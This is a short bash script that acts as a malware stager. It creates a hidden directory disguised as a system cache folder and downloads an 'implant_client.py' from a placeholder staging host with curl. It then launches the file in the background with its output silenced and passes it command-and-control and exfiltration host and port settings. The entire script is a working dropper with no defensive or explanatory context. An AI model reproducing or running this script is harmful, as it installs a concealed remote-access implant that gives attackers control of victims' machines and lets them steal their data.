#!/bin/bash
STAGING_HOST="C2_SERVER_IP"
C2_HOST="C2_SERVER_IP"
C2_PORT="9999"
EXFIL_HOST="C2_SERVER_IP"
EXFIL_PORT="9090"

mkdir -p "${HOME}/.cache/.sysd"
cd "${HOME}/.cache/.sysd"

curl -s -o implant_client.py "http://${STAGING_HOST}:8080/implant_client.py"

nohup env C2_HOST="${C2_HOST}" C2_PORT="${C2_PORT}" EXFIL_HOST="${EXFIL_HOST}" EXFIL_PORT="${EXFIL_PORT}" \
  python3 implant_client.py >/dev/null 2>&1 &
disown $!
